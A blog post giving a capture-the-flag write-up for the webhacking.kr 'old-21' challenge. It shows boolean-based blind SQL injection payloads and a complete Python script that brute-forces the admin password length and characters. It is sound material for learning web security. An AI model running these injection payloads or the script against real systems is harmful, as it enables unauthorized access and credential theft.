---
layout: post
title: "[Webhacking.kr] Old-21 writeup"
categories: hacking writeup web
---

# Introduction
Link: [https://webhacking.kr/challenge/bonus-1](https://webhacking.kr/challenge/bonus-1)

# 1st try
I know we can get some clues from the vulnerable app because it's vulnerable to Blind SQL Injection.
My first attempt was a guessing the username and password to see the output.
![Normal output](/assets/images/old-21/1.png)

And the output when injection happens

![Injected output](/assets/images/old-21/2.png)

# Getting the clue
Further tests confirmed that `admin` was the correct username. By trying the following SQL Query, we can brute force the length of the password

```sql
SELECT id, pw FROM table_name WHERE id='admin' and length(pw)=1 or '1'='1'
```
After a bit of research, I found the `SUBSTRING` function in SQL allowed us to brute force the password by comparing with every character in the printable characters.

```sql
SELECT id, pw FROM table_name WHERE id='admin' and SUBSTRING(pw, 1, 1)='a' or '1'='1'
```

I wrote a short script to automate the process:
```python
import requests, string

cookies = {
    'PHPSESSID': 'gvgm13av4uouf78ujrhlvn2qot',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.8,vi;q=0.5,ja;q=0.3',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://webhacking.kr/challenge/bonus-1/index.php?id=admin%27+and+length%28pw%29+%3D+4+or+%271%27%3D%271&pw=a',
    # 'Cookie': 'PHPSESSID=gvgm13av4uouf78ujrhlvn2qot',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

def brute_pw_length():
    for i in range(100):
        print(f"trying {i}")
        payload = {
            'id': f"admin' and length(pw) = {i} or '1'='1",
            'pw': 'a',
        }

        response = requests.get('https://webhacking.kr/challenge/bonus-1/index.php', params=payload, cookies=cookies, headers=headers)
        if 'fail' not in response.text:
            print(f"{i} is the one")
            return i

def brute_pw(len):
    pw = ''
    for i in range(1, len+1):
        for c in string.printable:
            payload = {
                'id': f"admin' and substring(pw, {i}, 1) = '{c}' or '1'='1",
                'pw': 'a',
            }
            r = requests.get('https://webhacking.kr/challenge/bonus-1/index.php', params=payload, cookies=cookies, headers=headers)
            if 'fail' not in r.text:
                pw+= c
                print(f'password: {pw}')
                break

    print(f'password is: {pw}')

l = brute_pw_length()
brute_pw(l)
```

# Conclusion
A basic but useful challenge to help me getting more insights into Blind SQL Injection.